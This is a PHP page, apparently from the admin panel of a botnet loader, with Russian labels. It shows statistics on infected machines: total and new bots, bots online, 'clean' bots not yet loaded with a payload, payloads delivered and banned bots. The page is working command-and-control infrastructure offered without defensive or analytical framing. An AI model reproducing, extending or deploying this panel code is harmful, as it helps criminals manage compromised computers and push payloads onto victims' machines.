<?php

if(!defined('GRANTED')) die;

include '../include/mysql.php';
mysql_connect($db_host, $db_user, $db_pass) or die('<font color=red>Не удалось подключиться к базе!</font>');
mysql_select_db($db_name) or die('<font color=red>Не найдена база "'.$db_name.'"!</font>');

$row = mysql_fetch_array(mysql_query('SELECT COUNT(*), SUM(onboard) FROM bots'));
$btotn = $row[0];
$tloads = intval($row[1]);
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE birthday>'.(time()-86400)));
$btotd = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE birthday>'.(time()-3600)));
$btoth = $row[0];


$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-$delay)));
$bonn = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-86400)));
$bond = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE lastknock>'.(time()-3600)));
$bonh = $row[0];


$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0'));
$bcln = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0 AND lastknock>'.(time()-86400)));
$bcld = $row[0];
$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE onboard=0 AND lastknock>'.(time()-3600)));
$bclh = $row[0];

$row = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM bots WHERE nextload>'.(time()-86400)));
$bdld = $row[0];

echo '<table align=center width=904 style="margin-top:-2px;margin-bottom:3px;" cellpadding=1 cellspacing=1>
<tr>
	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Общая статистика</td></tr>
	<tr>
		<td align=right>Количество ботов всего:</td>
		<td align=left width=60px><b>'.$btotn.'</b></td>
	</tr>
	<tr>
		<td align=right>Новых ботов за день:</td>
		<td align=left><b>'.$btotd.'</b></td>
	</tr>
	<tr>
		<td align=right>Новых ботов за час:</td>
		<td align=left><b>'.$btoth.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Статистика онлайна</td></tr>
	<tr>
		<td align=right>Ботов онлайн всего:</td>
		<td align=left width=60px><b>'.$bonn.'</b></td>
	</tr>
	<tr>
		<td align=right>Ботов онлайн за день:</td>
		<td align=left><b>'.$bond.'</b></td>
	</tr>
	<tr>
		<td align=right>Ботов онлайн за час:</td>
		<td align=left><b>'.$bonh.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Статистика чистых</td></tr>
	<tr>
		<td align=right>Чистых ботов всего:</td>
		<td align=left width=60px><b>'.$bcln.'</b></td>
	</tr>
	<tr>
		<td align=right>Чистых ботов за день:</td>
		<td align=left><b>'.$bcld.'</b></td>
	</tr>
	<tr>
		<td align=right>Чистых ботов за час:</td>
		<td align=left><b>'.$bclh.'</b></td>
	</tr>
	</table>
	</td>

	<td width=25%>
	<table width=100% class=table cellpadding=1 cellspacing=1>
	<tr><td align=center colspan=2 class=table1>Статистика загрузок</td></tr>
	<tr>
		<td align=right>Сделано загрузок всего:</td>
		<td align=left width=60px><b>'.$tloads.'</b></td>
	</tr>
	<tr>
		<td align=right>Средняя нагрузка на бота:</td>
		<td align=left><b>'.round($tloads/$btotn, 2).'</b></td>
	</tr>
	<tr>
		<td align=right>Временно забаненые боты:</td>
		<td align=left><b>'.$bdld.'</b></td>
	</tr>
	</table>
	</td>
</tr>
</table>';

?>